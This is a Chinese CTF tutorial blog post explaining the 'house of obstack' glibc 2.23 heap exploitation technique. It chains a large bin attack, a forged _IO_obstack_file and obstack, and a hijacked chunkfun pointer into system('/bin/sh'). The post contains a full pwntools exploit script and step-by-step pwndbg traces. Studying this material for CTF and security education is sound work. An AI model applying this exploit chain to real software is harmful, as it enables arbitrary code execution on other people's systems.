---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其八
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其八

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-33 house of obstack

自 glibc 2.24 版本引入针对 **`_IO_FILE_plus` 虚表（vtable）** 的严格范围检查机制后，部分传统的基于 IO_FILE 结构的利用方法（例如直接伪造 `_IO_str_jumps`）的有效性受到了限制。本章将深入分析一种在此加固环境下仍可达成代码执行的利用技术。该技术的核心思路在于，**将堆内存破坏所能达成的任意地址写能力，与 glibc 内部一个合法但较少被使用的 IO 跳转表相结合**，从而构建出一条特定的利用链。

该技术的执行流程可概括为以下三个主要阶段：

1.  **获取内存写原语**：首先，通过 **Large Bin Attack** 等堆漏洞利用方法，获得一次关键的**任意地址写**能力。此为后续所有操作的前提。

2.  **修改 IO 链表并布置结构**：利用获得的写原语，修改管理所有 IO 流的全局链表头 `_IO_list_all` 的值，使其指向一个在堆上预先构造的 **`_IO_obstack_file`** 结构体。**此技术的核心绕过机制**在于，将该结构体的虚表指针设置为 libc 内部合法的 **`_IO_obstack_jumps`** 符号地址。由于该地址本身位于 glibc 认可的合法 vtable 内存区间内，因此能够通过 vtable 的范围检查。

3.  **触发执行路径实现代码执行**：最终，当程序因调用 `abort()`、`exit()` 或满足缓冲区刷新条件而触发 `_IO_flush_all_lockp` 函数时，该函数会遍历被修改的链表。对于链表中我们伪造的文件流，其 `_IO_OVERFLOW` 函数指针实际指向 `_IO_obstack_jumps` 表中的 **`_IO_obstack_xsputn`** 函数。通过精确控制伪造结构体中的相关字段（例如 `_IO_write_ptr`、`obstack.chunkfun` 等），利用者可以引导 `_IO_obstack_xsputn` 及其后续函数（如 `_obstack_newchunk`）的执行逻辑，从而将控制流导向指定地址，实现代码执行。

本章后续部分将逐步拆解上述每个阶段的技术细节、内存布局要求与必要条件，阐明如何借助合法的内部结构，在存在 vtable 检查的环境中实现控制流导向。

相关glibc完整源码参见[obprintf.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/obprintf.c#L76)：

```c
struct _IO_obstack_file
{
  struct _IO_FILE_plus file;
  struct obstack *obstack;
};

struct obstack          /* control current object in current chunk */
{
  long chunk_size;              /* preferred size to allocate chunks in */
  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
  char *object_base;            /* address of object we are building */
  char *next_free;              /* where to add next char to current object */
  char *chunk_limit;            /* address of char after current chunk */
  union
  {
    PTR_INT_TYPE tempint;
    void *tempptr;
  } temp;                       /* Temporary for some macros.  */
  int alignment_mask;           /* Mask of alignment for each object. */
  /* These prototypes vary based on 'use_extra_arg', and we use
     casts to the prototypeless function type in all assignments,
     but having prototypes here quiets -Wstrict-prototypes.  */
  struct _obstack_chunk *(*chunkfun) (void *, long);
  void (*freefun) (void *, struct _obstack_chunk *);
  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
  unsigned maybe_empty_object : 1; /* There is a possibility that the current
				      chunk contains a zero-length object.  This
				      prevents freeing the chunk if we allocate
				      a bigger chunk to replace it. */
  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
				     handler on error, but retained for binary
				     compatibility.  */
};

static _IO_size_t
_IO_obstack_xsputn (_IO_FILE *fp, const void *data, _IO_size_t n)
{
  struct obstack *obstack = ((struct _IO_obstack_file *) fp)->obstack;

  if (fp->_IO_write_ptr + n > fp->_IO_write_end)
    {
      int size;

      /* We need some more memory.  First shrink the buffer to the
	 space we really currently need.  */
      obstack_blank_fast (obstack, fp->_IO_write_ptr - fp->_IO_write_end);

      /* Now grow for N bytes, and put the data there.  */
      obstack_grow (obstack, data, n);

      /* Setup the buffer pointers again.  */
      fp->_IO_write_base = obstack_base (obstack);
      fp->_IO_write_ptr = obstack_next_free (obstack);
      size = obstack_room (obstack);
      fp->_IO_write_end = fp->_IO_write_ptr + size;
      /* Now allocate the rest of the current chunk.  */
      obstack_blank_fast (obstack, size);
    }
  else
    fp->_IO_write_ptr = __mempcpy (fp->_IO_write_ptr, data, n);

  return n;
}

#define obstack_grow(OBSTACK, where, length)                                   \
  __extension__({                                                              \
    struct obstack *__o = (OBSTACK);                                           \
    int __len = (length);                                                      \
    if (__o->next_free + __len > __o->chunk_limit)                             \
      _obstack_newchunk(__o, __len);                                           \
    memcpy(__o->next_free, where, __len);                                      \
    __o->next_free += __len;                                                   \
    (void)0;                                                                   \
  })
  
void
_obstack_newchunk (struct obstack *h, int length)
{
  struct _obstack_chunk *old_chunk = h->chunk;
  struct _obstack_chunk *new_chunk;
  long new_size;
  long obj_size = h->next_free - h->object_base;
  long i;
  long already;
  char *object_base;

  /* Compute size for new chunk.  */
  new_size = (obj_size + length) + (obj_size >> 3) + h->alignment_mask + 100;
  if (new_size < h->chunk_size)
    new_size = h->chunk_size;

  /* Allocate and initialize the new chunk.  */
  new_chunk = CALL_CHUNKFUN (h, new_size);
  if (!new_chunk)
    (*obstack_alloc_failed_handler)();
  h->chunk = new_chunk;
  new_chunk->prev = old_chunk;
  new_chunk->limit = h->chunk_limit = (char *) new_chunk + new_size;

  /* Compute an aligned object_base in the new chunk */
  object_base =
    __PTR_ALIGN ((char *) new_chunk, new_chunk->contents, h->alignment_mask);

  /* Move the existing object to the new chunk.
     Word at a time is fast and is safe if the object
     is sufficiently aligned.  */
  if (h->alignment_mask + 1 >= DEFAULT_ALIGNMENT)
    {
      for (i = obj_size / sizeof (COPYING_UNIT) - 1;
	   i >= 0; i--)
	((COPYING_UNIT *) object_base)[i]
	  = ((COPYING_UNIT *) h->object_base)[i];
      /* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,
	 but that can cross a page boundary on a machine
	 which does not do strict alignment for COPYING_UNITS.  */
      already = obj_size / sizeof (COPYING_UNIT) * sizeof (COPYING_UNIT);
    }
  else
    already = 0;
  /* Copy remaining bytes one by one.  */
  for (i = already; i < obj_size; i++)
    object_base[i] = h->object_base[i];

  /* If the object just copied was the only data in OLD_CHUNK,
     free that chunk and remove it from the chain.
     But not if that chunk might contain an empty object.  */
  if (!h->maybe_empty_object
      && (h->object_base
	  == __PTR_ALIGN ((char *) old_chunk, old_chunk->contents,
			  h->alignment_mask)))
    {
      new_chunk->prev = old_chunk->prev;
      CALL_FREEFUN (h, old_chunk);
    }

  h->object_base = object_base;
  h->next_free = h->object_base + obj_size;
  /* The new chunk certainly contains no empty object yet.  */
  h->maybe_empty_object = 0;
}
# ifdef _LIBC
libc_hidden_def (_obstack_newchunk)
# endif

#define CALL_CHUNKFUN(h, size)                                                 \
  (((h)->use_extra_arg)                                                        \
       ? (*(h)->chunkfun)((h)->extra_arg, (size))                              \
       : (*(struct _obstack_chunk * (*)(long))(h)->chunkfun)((size)))
```

本方法的执行触发依赖于glibc内部一条确定的错误处理与内存管理路径。具体而言，利用者可通过触发堆异常（如双重释放）来引导程序调用 **`malloc_printerr`** 函数。该函数在处置错误时，会调用 **`_IO_flush_all_lockp`** 以刷新所有已注册的IO流。

`_IO_flush_all_lockp` 函数会遍历 `_IO_list_all` 链表，并对其中每个文件流执行其虚表（vtable）中定义的 **`_IO_OVERFLOW`** 函数。由于利用链已事先将伪造的 `_IO_obstack_file` 结构插入此链表，且将其虚表设置为 **`_IO_obstack_jumps`**，因此实际被调用的 `_IO_OVERFLOW` 实现即为 **`_IO_obstack_jumps`** 表中的 **`_IO_obstack_xsputn`** 函数。

`_IO_obstack_xsputn` 是 `obstack` 分配器的底层输出例程。其内部逻辑会进一步调用 **`obstack_grow`** 来申请内存，继而触发 **`_obstack_newchunk`** 函数以分配新的内存块。在 `_obstack_newchunk` 函数中，最终通过一个名为 **`CALL_CHUNKFUN`** 的宏来调用一个关键的函数指针。该指针的值可由利用者通过预先在伪造的 `_IO_obstack_file` 结构体中设定的相应字段（`obstack.chunkfun`）完全控制。

因此，整个调用链 **`malloc_printerr` → `_IO_flush_all_lockp` → `_IO_OVERFLOW` → `_IO_obstack_xsputn` → `obstack_grow` → `_obstack_newchunk` → `CALL_CHUNKFUN`** 构成了一条从触发堆管理器错误处理，到执行利用者指定代码的完整控制流路径。通过将 `CALL_CHUNKFUN` 指向预定目标（如 `system` 或 `one_gadget`），即可实现代码执行。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_obstack/exploit.py)。

核心利用代码如下：

```python
# house of obstack
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_obstack_jumps = libc.sym["_IO_obstack_jumps"]
log.info(f"_IO_obstack_jumps addr: {hex(_IO_obstack_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

fake_obstack = b"\x00" * 0x18 + p64(1)
fake_obstack = fake_obstack.ljust(0x20, b"\x00") + p64(0)
fake_obstack = fake_obstack.ljust(0x38, b"\x00") + p64(system)
fake_obstack = fake_obstack.ljust(0x48, b"\x00") + p64(binsh_addr)
fake_obstack = fake_obstack.ljust(0x50, b"\x00") + b"\x01"
payload = b"\x00" * 0x20 + fake_obstack
edit(0, len(payload), payload)

fake_io = b"\x00" * (0x28 - 0x10) + p64(1)
fake_io = fake_io.ljust(0x30 - 0x10) + p64(0)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_obstack_jumps + 0x20)
fake_io += p64(chunk0_addr + 0x30)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
cmd = b"cat src/2.23/house_of_obstack/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在针对glibc堆管理器的漏洞利用中，一种常见的技术是通过操纵不同bins（空闲链表）中内存块的状态与元数据，来获取关键的地址信息。以下描述了一个精心构造的内存操作序列，旨在从**unsorted bin**中诱导出一个chunk迁移至**large bin**，并利用其特有的指针结构泄露**libc基址**与**堆地址**，为后续的漏洞利用（如劫持控制流）奠定基础。

**1. 初始状态准备**
首先，连续分配三个动态内存块：`chunk[0]`、`chunk[1]`和`chunk[2]`。其中，`chunk[1]`用于隔离`chunk[0]`与`chunk[2]`，防止它们物理相邻导致合并。关键约束条件是 `chunk[0]->size > chunk[2]->size`，这确保`chunk[0]`的尺寸足够大，在后续步骤中符合进入large bin的条件（通常尺寸 ≥ 1024字节，具体阈值因glibc版本和架构而异）。

**2. 释放至Unsorted Bin并构造隔离**
随后，释放`chunk[0]`。由于它不与top chunk相邻，且尺寸不属于fast bin范围，因此被插入**unsorted bin**。在glibc的实现中，unsorted bin是一个双向循环链表，此时`chunk[0]`的`fd`和`bk`指针均指向`main_arena`结构体中的特定位置（例如`main_arena+88`）。该地址与libc库的基址存在固定偏移。

**3. 触发迁移至Large Bin**
接着，程序申请一个新的内存块`chunk[3]`，其尺寸满足：`chunk[3]->size > chunk[0]->size`。由于unsorted bin中的`chunk[0]`尺寸不足以满足此次分配请求，分配器会遍历unsorted bin。对于无法直接满足请求的chunk，会根据其尺寸将其归类并转移到对应的small bin或large bin中。由于`chunk[0]`尺寸较大，它被从unsorted bin中摘下，并插入到对应的**large bin**链表中。

**4. Large Bin中的指针状态与信息泄露**
在large bin中，chunk不仅维护用于双向链表遍历的`fd`/`bk`指针，还维护一组用于快速遍历不同尺寸chunk的`fd_nextsize`/`bk_nextsize`指针。当large bin为空，或`chunk[0]`成为该尺寸区间内的唯一（或第一个）chunk时，其`fd_nextsize`和`bk_nextsize`指针会被初始化为指向自身（即`chunk[0]`的地址）。此时，`chunk[0]`的元数据区包含以下关键指针：
- `fd` 与 `bk`：指向`main_arena`中的地址（**libc相关地址**）。
- `fd_nextsize` 与 `bk_nextsize`：指向`chunk[0]`自身（**堆地址**）。

**5. 地址信息提取**
最后，通过调用诸如`show(0)`之类的功能函数，程序会输出`chunk[0]`用户数据区的内容。由于该chunk已被释放，其用户数据区的前若干个字节已被分配器覆写为上述指针值。因此，可以从此输出中同时解析出：
- 来自`fd`/`bk`的`main_arena`相关地址，通过计算与libc的固定偏移，可得到**libc基址**。
- 来自`fd_nextsize`/`bk_nextsize`的指向自身的指针，可直接得到**堆内存区域的起始地址**。

至此，成功获取了后续利用所必需的两个关键内存布局信息：**libc基址**与**堆地址**。这为构造如`__free_hook`覆写、ROP链部署或堆风水（Heap Feng Shui）等高级利用技术提供了基础。此技术巧妙地利用了glibc分配器在管理large bin时对chunk元数据的初始化逻辑，将正常的堆操作转化为信息泄露的渠道。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x5e2b222aa000
Size: 0x430 (with flag bits: 0x431)
fd: 0x772db838df68
bk: 0x772db838df68
fd_nextsize: 0x5e2b222aa000
bk_nextsize: 0x5e2b222aa000

Allocated chunk
Addr: 0x5e2b222aa430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x5e2b222aa940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x5e2b222aad50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x5e2b222ab260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x5e2b222aa000 —▸ 0x772db838df68 (main_arena+1096) ◂— 0x5e2b222aa000
pwndbg> 
```

在成功泄露libc基址与堆地址后，利用流程进入关键的准备阶段。下一步的核心是篡改位于large bin中的`chunk[0]`的特定元数据指针，为实施**Large Bin Attack**——一种能够在特定地址写入一个大型堆地址（heap address）的原语——创造必要条件。此操作为后续劫持`_IO_list_all`全局指针并触发文件流导向编程（FSOP）利用奠定基础。

**元数据指针的定向篡改**
利用已获取的堆地址和堆上的写原语，可以覆盖已被释放的`chunk[0]`的关键指针字段。具体篡改目标如下：
*   **修改`bk`指针**：将其从原本指向`main_arena`的地址，覆写为`p64(_IO_list_all - 0x10)`。`_IO_list_all`是glibc中管理所有`FILE`结构链表的全局头指针。
*   **修改`bk_nextsize`指针**：将其从指向自身的堆地址，覆写为`p64(_IO_list_all - 0x20)`。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x5e2b222aa000 —▸ 0x772db838df68 (main_arena+1096) ◂— 0x5e2b222aa000
BK: 0x5e2b222aa000 —▸ 0x772db838e530 ◂— 0
pwndbg> x/6gx 0x5e2b222aa000
0x5e2b222aa000: 0x0000000000000000      0x0000000000000431
0x5e2b222aa010: 0x0000772db838df68      0x0000772db838e530
0x5e2b222aa020: 0x00005e2b222aa000      0x0000772db838e520
pwndbg> x/1gx &_IO_list_all
0x772db838e540 <__GI__IO_list_all>:     0x0000772db838e560
pwndbg> 
```

在完成对large bin中`chunk[0]`的`bk`与`bk_nextsize`指针的定向篡改后，利用流程进入关键的触发阶段。此时内存布局为：`chunk[2]`作为一个空闲块位于**unsorted bin**中，而`chunk[0]`则位于**large bin**中且其关键指针已被篡改。接下来，通过一个特定尺寸的内存分配操作，可以触发glibc分配器内部将unsorted bin chunk插入large bin的特定代码路径，从而激活**Large Bin Attack**，实现对两个目标地址的任意堆地址写入。

**触发两次任意地址写的分配操作**
程序申请一个新的内存块`chunk[4]`，其尺寸`size`需满足：
1.  `chunk[4]->size > chunk[2]->size`：确保位于unsorted bin中的`chunk[2]`因尺寸不足而无法直接满足此次分配请求。
2.  `chunk[4]->size > chunk[0]->size`：确保在large bin中，`chunk[0]`的尺寸也不足以满足请求，从而迫使分配器在整理unsorted bin时，将`chunk[2]`插入到`chunk[0]`所在的large bin链表中。

由于unsorted bin中的`chunk[2]`无法直接满足分配，分配器将遍历unsorted bin以寻找合适的块。在此过程中，`chunk[2]`（记为`victim`）因其较大的尺寸，将被从unsorted bin中摘下，并**插入到对应的large bin链表**中。正是这个插入操作，触发了glibc分配器中以下两行关键的指针操作：

**Large Bin Attack的双重写入机制**
在large bin的插入逻辑中，分配器会执行以下操作来维护其双链表结构（包括主链表`fd/bk`和用于跳跃不同尺寸的`fd_nextsize/bk_nextsize`链表）：
1.  **`bk`指针的利用**：执行操作 `victim->bk->fd = victim`。
    *   由于此前已预先将large bin中`chunk[0]`的`bk`指针篡改为`_IO_list_all - 0x10`，使得`victim->bk`指向该地址。
    *   因此，`victim->bk->fd`即`*(_IO_list_all - 0x10 + 0x10)`，也就是`*_IO_list_all`。
    *   **结果**：`_IO_list_all`被写入`victim`的地址（即`chunk[2]`的堆地址）。
2.  **`bk_nextsize`指针的利用**：执行操作 `victim->bk_nextsize->fd_nextsize = victim`。
    *   此前已预先将`chunk[0]`的`bk_nextsize`指针篡改为`p64(target2)`，其中`target2`是选择的另一个目标地址（例如`_IO_list_all - 0x20`，或其他关键全局变量如`global_max_fast`的地址）。
    *   因此，`victim->bk_nextsize->fd_nextsize`即`*(target2 + 0x20)`。
    *   **结果**：`target2`偏移`+0x20`处被写入`victim`的地址（即`chunk[2]`的堆地址）。

**利用达成与后续影响**
至此，一次Large Bin Attack成功触发了**两次任意的堆地址写入**：
*   第一次写入（通过`bk`）将堆地址写入`_IO_list_all`，这是**文件流导向编程（FSOP）** 利用的关键前置步骤。它使得IO流链表头指向了可控的堆内存，为后续伪造`_IO_FILE_plus`结构并劫持控制流铺平了道路。
*   第二次写入（通过`bk_nextsize`）可将堆地址写入另一个关键位置。其具体利用目标取决于利用策略：写入`_IO_list_all`附近可用于辅助构造伪造的IO结构；写入`global_max_fast`则可扰乱堆分配器的行为，将fast bin的尺寸阈值扩大至一个极大的值，可能导致后续的堆操作出现重叠或破坏，为利用提供更多可能性。

通过精心构造`bk`和`bk_nextsize`指向的目标地址，能够利用单次large bin插入操作，在内存中两个精心选择的位置植入可控的堆地址，从而极大地增强了后续漏洞利用的灵活性和威力。此步骤将堆元数据的破坏成功转化为对关键全局数据结构的双重污染。

```bash
pwndbg> x/1gx &_IO_list_all
0x772db838e540 <__GI__IO_list_all>:     0x00005e2b222aa940
pwndbg> x/10gx chunks
0x5e2b1322f060 <chunks>:        0x0000000000000020      0x00005e2b222aa010
0x5e2b1322f070 <chunks+16>:     0x0000000000000500      0x00005e2b222aa440
0x5e2b1322f080 <chunks+32>:     0x0000000000000400      0x00005e2b222aa950
0x5e2b1322f090 <chunks+48>:     0x0000000000000500      0x00005e2b222aad60
0x5e2b1322f0a0 <chunks+64>:     0x0000000000000500      0x00005e2b222ab270
pwndbg> 
```

在成功通过Large Bin Attack将`_IO_list_all`全局指针覆写为指向可控堆地址（`chunk[2]`）后，利用进入最终阶段。此阶段利用已获得的**任意地址写**能力，在可控堆内存中伪造关键数据结构以劫持控制流。一种经实践验证的高效策略是：串联伪造 **`_IO_obstack_file`** 及其关联的 **`obstack`** 结构体，通过劫持IO虚表函数指针与Obstack分配器函数指针，将一次常规的IO流刷新操作转化为任意命令执行。

**1. 利用载体选择：`_IO_obstack_file`**
`_IO_obstack_file`是一种特殊的`_IO_FILE_plus`结构，它将IO操作的底层缓冲管理委托给`obstack`对象。其虚函数表（vtable）中的`__overflow`条目（对应`_IO_overflow_t`函数指针）通常指向`_IO_obstack_overflow`。但通过伪造vtable，可将其直接设置为`_IO_obstack_xsputn`的地址。当IO层因缓冲区“满”而调用`_IO_OVERFLOW`宏时，实际执行的是`_IO_obstack_xsputn`。该函数在尝试向`obstack`写入数据时，最终会调用关联`obstack`结构中的`chunkfun`函数指针。通过构造此调用链，可将IO层的溢出处理重定向至可控的函数（如`system`）。

**2. 构造伪造的`_IO_obstack_file`结构体（于`chunk[2]`）**
鉴于`_IO_list_all`已被覆写为指向`chunk[2]`，需在其用户数据区起始处布置伪造的`_IO_obstack_file`结构，关键字段设置如下：
*   **虚表指针（`vtable`）**：指向一个伪造的vtable。此vtable中的`__overflow`条目必须精确设置为`_IO_obstack_xsputn`函数在libc中的真实地址。这确保了当`_IO_OVERFLOW`被调用时，执行流正确跳转到Obstack处理函数。
*   **`_flags`字段**：需包含如`_IO_USER_BUF`、`_IO_CURRENTLY_PUTTING`等标志，使IO层视该流为可写、活跃状态，以通过基础校验。
*   **`_IO_write_ptr`与`_IO_write_base`**：将`_IO_write_ptr`设置为大于`_IO_write_base`，模拟缓冲区有待输出数据，从而触发对`_IO_OVERFLOW`的调用。
*   **关联的`obstack`指针**：将此指针（位于结构体内特定偏移处）设置为指向另一个可控堆区域（如`chunk[0]`），该处将布置伪造的`obstack`结构。

**3. 构造伪造的`obstack`结构体（于`chunk[0]`）**
在`chunk[0]`布置伪造的`obstack`结构，以实现最终的命令执行，其核心字段如下：
*   **`chunkfun`函数指针**：此为最终劫持点。`_IO_obstack_xsputn`在需要为`obstack`分配新空间时，会通过`CALL_CHUNKFUN`宏调用`obstack->chunkfun`。需将此指针覆盖为目标函数（如`system`）的地址。
*   **`use_extra_arg`字段**：必须设置为**非零值**。当此字段非零时，`CALL_CHUNKFUN`宏在调用`chunkfun`时，会将`obstack->extra_arg`作为**第一个参数**传递，而非默认的`obstack`结构地址。
*   **`extra_arg`字段**：设置为希望传递给`system`函数的参数字符串地址，例如指向预先布置在堆中（如`chunk[1]`内）的`“/bin/sh\x00”`字符串的指针。

```bash
pwndbg> p/x *(struct _IO_obstack_file*)_IO_list_all
$1 = {
  file = {
    file = {
      _flags = 0x0,
      _IO_read_ptr = 0x411,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x1,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0x0,
      _flags2 = 0x0,
      _old_offset = 0x0,
      _cur_column = 0x0,
      _vtable_offset = 0x0,
      _shortbuf = {0x0},
      _lock = 0x0,
      _offset = 0x0,
      _codecvt = 0x0,
      _wide_data = 0x0,
      _freeres_list = 0x0,
      _freeres_buf = 0x0,
      __pad5 = 0x0,
      _mode = 0x0,
      _unused2 = {0x0 <repeats 20 times>}
    },
    vtable = 0x772db838b160
  },
  obstack = 0x5e2b222aa030
}
pwndbg> p/x *(struct _IO_jump_t*)0x772db838b160
$2 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x0,
  __overflow = 0x772db8069670,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x772db838c8e0
}
pwndbg> p/x &_IO_obstack_xsputn  
$3 = 0x772db8069670
pwndbg> p/x chunks[0]
$4 = {
  size = 0x71,
  addr = 0x5e2b222aa010
}
pwndbg> p/x *(struct obstack*)(0x5e2b222aa010+0x20)
$5 = {
  chunk_size = 0x0,
  chunk = 0x0,
  object_base = 0x0,
  next_free = 0x1,
  chunk_limit = 0x0,
  temp = {
    tempint = 0x0,
    tempptr = 0x0
  },
  alignment_mask = 0x0,
  chunkfun = 0x772db803c3eb,
  freefun = 0x0,
  extra_arg = 0x772db8156d73,
  use_extra_arg = 0x1,
  maybe_empty_object = 0x0,
  alloc_failed = 0x0
}
pwndbg> x/s 0x772db8156d73
0x772db8156d73: "/bin/sh"
pwndbg> x/5i 0x772db803c3eb
   0x772db803c3eb <__libc_system>:      sub    rsp,0x8
   0x772db803c3ef <__libc_system+4>:    test   rdi,rdi
   0x772db803c3f2 <__libc_system+7>:    jne    0x772db803c40a <__libc_system+31>
   0x772db803c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x772db8156d7b
   0x772db803c3fb <__libc_system+16>:   call   0x772db803be36 <do_system>
pwndbg>
```

当程序因调用`exit`、触发`abort`或`malloc_printerr`而执行`_IO_flush_all_lockp`时，会遍历`_IO_list_all`链表并尝试刷新每个IO流。执行流到达伪造的`_IO_obstack_file`结构后，IO层会检查其状态。通过正确设置`_flags`等字段，该伪造流被认为是一个可写的、活跃的输出流。随后，IO层在尝试刷新其输出缓冲区时，会判定需要执行overflow操作。这一判定通常基于对缓冲区指针（如`_IO_write_ptr`与`_IO_write_end`）的比较，当认为缓冲区已满或需要更多空间进行处理时，便会通过其虚表调用`__overflow`函数。由于伪造vtable中的`__overflow`条目被设置为`_IO_obstack_xsputn`的地址，因此实际执行的是`_IO_obstack_xsputn`函数，从而将执行流导入预设的Obstack处理路径。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x772db806de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_obstack_xsputn>
        rdi: 0x5e2b222aa940 ◂— 0
        rsi: 0xffffffff
        rdx: 0
```

进入`_IO_obstack_xsputn`函数后，其逻辑立即开始操作关联的`obstack`对象。函数首先通过`((struct _IO_obstack_file *) fp)->obstack;`这一语句，从作为参数传入的伪造`_IO_obstack_file`结构（即`fp`指针，指向`chunk[2]`）中提取`obstack`成员指针。该指针已在先前被设置为指向另一个完全可控的堆内存区域（即`chunk[0]`的地址）。因此，**执行流在此时从第一个伪造的IO结构，无缝地、必然地转入第二个伪造的`obstack`结构所定义的逻辑域中**。这意味着后续所有针对`obstack`的操作，包括对`chunkfun`、`freefun`、`use_extra_arg`及`extra_arg`等字段的解引用和使用，都将基于此前在`chunk[0]`处精心布置的恶意数据。这一步是连接IO层操作与底层内存分配器回调函数的关键枢纽，为后续调用被篡改的`chunkfun`（即`system`）并传递受控参数（`extra_arg`指向的`“/bin/sh”`）奠定了决定性基础。

```bash
In file: /home/bogon/workSpaces/glibc/libio/obprintf.c:65
   59 }
   60 
   61 
   62 static _IO_size_t
   63 _IO_obstack_xsputn (_IO_FILE *fp, const void *data, _IO_size_t n)
   64 {
 ► 65   struct obstack *obstack = ((struct _IO_obstack_file *) fp)->obstack;
```

随着执行流深入`_IO_obstack_xsputn`函数，当需要为输出数据分配更多内存时，代码会调用`obstack_grow`宏。该宏的核心是请求`obstack`分配指定大小的新空间，其内部会调用`_obstack_newchunk`函数。

```bash
In file: /home/bogon/workSpaces/glibc/libio/obprintf.c:76
   70 
   71       /* We need some more memory.  First shrink the buffer to the
   72          space we really currently need.  */
   73       obstack_blank_fast (obstack, fp->_IO_write_ptr - fp->_IO_write_end);
   74 
   75       /* Now grow for N bytes, and put the data there.  */
 ► 76       obstack_grow (obstack, data, n);
 
 ► 0x772db80696b6 <_IO_obstack_xsputn+70>    call   _obstack_newchunk           <_obstack_newchunk>
        arg0: 0x5e2b222aa030 ◂— 0
        arg1: 0
```

在`_obstack_newchunk`函数执行的最终阶段，代码会调用`CALL_CHUNKFUN`宏。此宏是连接伪造的`obstack`元数据与实际执行恶意代码的终极桥梁。根据`obstack`结构体中`use_extra_arg`字段的值，该宏的展开逻辑决定`chunkfun`函数的调用方式及其参数。

由于此前已预先将`obstack->use_extra_arg`设置为非零值，`CALL_CHUNKFUN`宏的展开会采用`(*(h)->chunkfun)((h)->extra_arg, (size))`的形式。此时：
*   `(h)->chunkfun`已被篡改为`system`函数的地址。
*   `(h)->extra_arg`已被设置为字符串`“/bin/sh”`的地址。

因此，该宏的调用实质上等价于执行`system(“/bin/sh”, (size))`。尽管存在一个额外的`size`参数，但在`system`函数的常见调用约定下，它通常会被忽略，从而成功执行`system(“/bin/sh”)`。至此，一次对`obstack`内存分配的请求，被精确地转化为了一次任意的命令执行，完成了从堆内存布局操控到完全控制流劫持的整个利用链条。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/obstack.c:261
   255   /* Compute size for new chunk.  */
